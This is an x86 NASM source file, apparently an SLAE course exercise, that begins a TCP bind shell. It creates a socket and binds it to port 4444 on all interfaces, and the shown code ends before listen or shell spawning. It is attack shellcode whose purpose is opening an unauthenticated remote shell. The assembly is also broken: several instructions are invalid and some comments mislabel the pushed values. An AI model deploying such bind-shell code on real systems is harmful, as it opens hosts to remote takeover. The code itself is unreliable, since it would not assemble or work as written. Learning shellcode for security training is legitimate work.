;Program: Tcp_Bind_Shell.nasm
;Author : Bhanu Teja
;SLAE-1426

global _start

section .text
_start

;
;setting all the registers to 0
;

xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx

;
;Creating a socket: socket(AF_INET, SOCK_STREAM, IP_PROTO_IP)
;

mov al, 0x66 	; socket syscall 102 | Hex equivalent is 0x66
mov bl, 0x1  	; socket syscall function SOCKET is 1 | #define SYS_SOCKET 1 

;
; we need to push AF_INET, SOCK_STREAM, IP_PROTO as a single argument. This can be done by pushing them onto stack in the reverse order
;

push ecx     	; ecx value is zero and is pushed onto the stack as value for IP_PORTO_IP
push bl	     	; ebx value is 1 and is pushed onto stack as value for SOCK_STREAM
push 0x2     	; AF_INET value is 2 and is pushed on to the stack
mov ecx, esp 	; esp is pushed into ecx and now points to arguments
int 0x80     	; execute

;
;Binding the socket: bind(host_sock, (sin.family=AF_INET, sin_port=4444, sin_addr=0.0.0.0), sizeof(host_addr));
;

mov edi, eax 	; sockfd is now moved into edi
mov al, 0x66 	; socket syscall 102 | Hex equivalent is 0x66
mov bl, 0x2	; socket syscall function BIND is 2 | #define SYS_BIND 2
xor edx, edx	; zeroing edx
push edx	; edx onto the stack for host_addr INADDR_ANY = 0
push byte 0x5c11; sin.port=4444 | hex equivalent is 0x115c => 0x5c11 Little Endian
push bl		; AF_INET value is 2
push ecx, esp	; ecx points to args
push 0x10	; sizeof host
push ecx	; push address onto stack
push edi	; edi has the sockfd
mov ecx, esp	; point ecx to top of stack
int 0x80	; execute

